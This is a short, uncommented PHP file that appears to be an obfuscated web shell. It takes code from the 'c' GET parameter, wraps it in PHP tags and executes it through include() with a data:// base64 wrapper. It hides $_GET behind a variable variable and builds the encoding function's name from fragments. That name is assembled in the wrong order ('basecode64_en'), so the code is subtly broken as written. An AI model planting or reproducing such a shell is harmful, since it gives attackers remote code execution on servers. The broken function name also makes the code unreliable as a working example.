<?php
$a = '_GET';
$b = 'c';
if(isset(${$a}[$b])) {
    $part1 = "base";
    $part2 = "64_en";
    $part3 = "code";
    $func = $part1 . $part3 . $part2;
    $code = "<" . "?" . "php " . ${$a}[$b] . " ?" . ">";
    include 'data' . '://text/plain;base64,' . $func($code);
}
?>
